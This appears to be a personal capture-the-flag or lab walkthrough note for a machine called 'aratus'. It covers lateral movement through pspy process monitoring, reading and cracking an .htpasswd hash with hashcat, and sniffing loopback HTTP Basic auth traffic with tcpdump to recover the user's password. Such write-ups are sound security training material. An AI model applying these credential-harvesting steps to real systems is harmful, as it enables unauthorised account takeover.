From [[COMPUTER INFORMATION]]
### USING PSPY64

---

Executed from **theodore**

```bash
2024/05/10 12:18:02 CMD: UID=1001 PID=18226  | /bin/sh -c uname -p 2> /dev/null 
2024/05/10 12:18:01 CMD: UID=1001 PID=18223  | /bin/sh -c /usr/bin/python3 /home/theodore/scripts/test-www-auth.py >/dev/null 2>&1 
2024/05/10 12:17:02 CMD: UID=1001 PID=18165  | /usr/bin/python3 /home/theodore/scripts/test-www-auth.py 
```

**No write permissions to where the folders there are nor the files**

Maybie worth it seeing what is inside www

```bash
[simeon@aratus html]$ ls -la
total 0
drwxr-xr-x. 4 root root  37 Jan 25  2022 .
drwxr-xr-x. 4 root root  33 Jan 25  2022 ..
drwxr-xr-x. 2 root root 230 Jan 10  2022 simeon
drwxr-xr-x. 2 root root  41 Nov 23  2021 test-auth
```

```bash
[simeon@aratus test-auth]$ ls -la
total 8
drwxr-xr-x. 2 root root  41 Nov 23  2021 .
drwxr-xr-x. 4 root root  37 Jan 25  2022 ..
-rw-r--r--. 1 root root  47 Nov 23  2021 .htpasswd
-rw-r--r--. 1 root root 109 Nov 23  2021 index.html
[simeon@aratus test-auth]$ cat .htpasswd 
theodore:$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1

```

**ahahhahah laughes with a smirk** 

```bash
 hashcat -m 1600 --show theodore_hash ../../Tools/rockyou.txt 
$apr1$pP2GhAkC$R12mw5B5lxUiaNj4Qt2pX1:testing123
```

**SAD IT IS NOT THE USER'S PASS**

**Took a couple of minutes but after seeing the test-www-auth.py i thought about using tcpdump to see incoming packets from 127.0.0.1 and see what was in them**

One of these include the response to a challenge with basic http authentication.

Authorization: Basic dGhlb2RvcmU6UmlqeWFzd2FoZWJjZWliYXJqaWs=\r\n
	Credentials: theodore:Rijyaswahebceibarjik
\r\n

Turns out these are theodore's credentials, now we get to be [[theodore]]